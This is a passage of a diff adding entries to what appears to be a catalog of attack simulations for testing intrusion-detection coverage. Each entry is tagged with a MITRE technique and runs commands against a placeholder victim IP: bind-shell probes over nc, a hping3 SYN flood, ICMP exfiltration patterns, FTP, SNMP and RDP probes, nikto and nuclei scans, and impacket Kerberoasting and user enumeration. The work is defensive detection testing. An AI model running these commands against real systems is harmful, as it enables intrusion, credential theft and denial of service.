+      echo "reverse shell pattern sent to :4444"
+
+  - name: nc-bind-shell-probe
+    category: c2-raw
+    mitre: T1059.004
+    rationale: "Connect to common bind shell ports — post-exploitation indicator"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      for PORT in 4444 5555 1337 31337 9001; do
+        timeout 2 bash -c "echo 'id' | nc -w 1 {{VICTIM_IP}} $PORT" 2>&1 || true
+      done
+      echo "bind shell port probes completed"
+
+  - name: tcp-syn-flood-burst
+    category: evasion
+    mitre: T1498
+    rationale: "Brief SYN burst with hping3 — tests SYN flood detection threshold (10 packets only)"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      timeout 5 hping3 -S -p 80 -c 10 --fast "{{VICTIM_IP}}" 2>&1 | tail -5
+
+  - name: tcp-fragment-evasion
+    category: evasion
+    mitre: T1027
+    rationale: "IP fragment evasion via hping3 — fragmented SYN to port 80"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      timeout 5 hping3 -S -p 80 -f -c 5 "{{VICTIM_IP}}" 2>&1 | tail -5
+
+  # ========================================================================
+  # ICMP / ping abuse
+  # ========================================================================
+
+  - name: icmp-large-payload
+    category: icmp-tunnel
+    mitre: T1095
+    rationale: "ICMP echo with oversized payload — tunnel/exfil indicator"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      ping -c 3 -s 1400 -W 2 "{{VICTIM_IP}}" 2>&1 | tail -5
+
+  - name: icmp-data-exfil-pattern
+    category: icmp-tunnel
+    mitre: T1048.001
+    rationale: "ICMP echo with ASCII payload — data exfiltration via ping"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      timeout 5 hping3 --icmp -c 3 -d 200 --data "$(printf '%0.s41' {1..200})" "{{VICTIM_IP}}" 2>&1 | tail -5
+
+  # ========================================================================
+  # Protocol-specific abuse — FTP / SNMP / LDAP / RDP
+  # ========================================================================
+
+  - name: ftp-anonymous-login
+    category: recon
+    mitre: T1078.001
+    rationale: "FTP anonymous login attempt — default credential probe"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      timeout 5 bash -c "
+      exec 3<>/dev/tcp/{{VICTIM_IP}}/21
+      read -t 2 banner <&3
+      echo 'USER anonymous' >&3
+      read -t 2 resp1 <&3
+      echo 'PASS test@test.com' >&3
+      read -t 2 resp2 <&3
+      echo 'QUIT' >&3
+      exec 3<&-
+      echo \"banner: \$banner\"
+      echo \"user: \$resp1\"
+      echo \"pass: \$resp2\"
+      " 2>&1 || echo "FTP connection failed (expected if no FTP server)"
+
+  - name: snmp-community-walk
+    category: recon
+    mitre: T1602
+    rationale: "SNMP community string walk with 'public' — information disclosure"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      timeout 5 python3 -c "
+      import socket, struct
+      # SNMPv1 GetRequest for sysDescr.0 with community 'public'
+      pdu = bytes.fromhex('302902010004067075626c6963a01c02044761f97a020100020100300e300c06082b060102010101000500')
+      sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      sock.settimeout(3)
+      sock.sendto(pdu, ('{{VICTIM_IP}}', 161))
+      try:
+          data, addr = sock.recvfrom(4096)
+          print(f'SNMP response: {len(data)} bytes from {addr}')
+      except socket.timeout:
+          print('SNMP: no response (expected if no SNMP agent)')
+      sock.close()
+      " 2>&1
+
+  - name: rdp-nla-probe
+    category: recon
+    mitre: T1021.001
+    rationale: "RDP NLA connection initiation — remote desktop recon"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      timeout 5 bash -c "
+      exec 3<>/dev/tcp/{{VICTIM_IP}}/3389
+      # Send RDP Connection Request (X.224 CR)
+      printf '\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00' >&3
+      read -t 2 -n 100 resp <&3
+      exec 3<&-
+      echo \"RDP response received (${#resp} bytes)\"
+      " 2>&1 || echo "RDP connection failed (expected if no RDP server)"
+
+  - name: nikto-web-scan
+    category: scanning
+    mitre: T1595.002
+    rationale: "Nikto web vulnerability scanner — distinctive UA and path patterns"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      timeout 30 nikto -h "{{VICTIM_IP}}" -p 80 -maxtime 20s 2>&1 | tail -15
+
+  # ========================================================================
+  # Kerberos / AD protocol abuse — impacket
+  # ========================================================================
+
+  - name: impacket-kerberoast
+    category: credential-access
+    mitre: T1558.003
+    rationale: "Kerberoasting — request TGS tickets for offline cracking"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      timeout 15 impacket-GetUserSPNs "TESTDOM/admin:wrongpassword" \
+        -dc-ip "{{VICTIM_IP}}" -request 2>&1 | head -10
+
+  - name: impacket-samrdump
+    category: recon
+    mitre: T1087.002
+    rationale: "SAMR domain user enumeration via named pipe"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      timeout 15 impacket-samrdump "{{VICTIM_IP}}" 2>&1 | head -15
+
+  # ========================================================================
+  # Nuclei — template-based vulnerability scanning
+  # ========================================================================
+
+  - name: nuclei-cve-scan
+    category: scanning
+    mitre: T1595.002
+    rationale: "Nuclei CVE templates — automated vulnerability validation (top 20 templates)"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      timeout 60 nuclei -u "http://{{VICTIM_IP}}" -tags cve -severity critical,high \
+        -rate-limit 5 -c 3 -silent 2>&1 | head -20
+
+  - name: nuclei-exposures-scan
+    category: scanning
+    mitre: T1595.002
+    rationale: "Nuclei exposure templates — sensitive file/path discovery"
+    expected_sids: []
+    expected_verdict: UNDETECTED
+    already_in_catalog: false
+    command: |
+      timeout 60 nuclei -u "http://{{VICTIM_IP}}" -tags exposure -severity medium,high,critical \
+        -rate-limit 5 -c 3 -silent 2>&1 | head -20
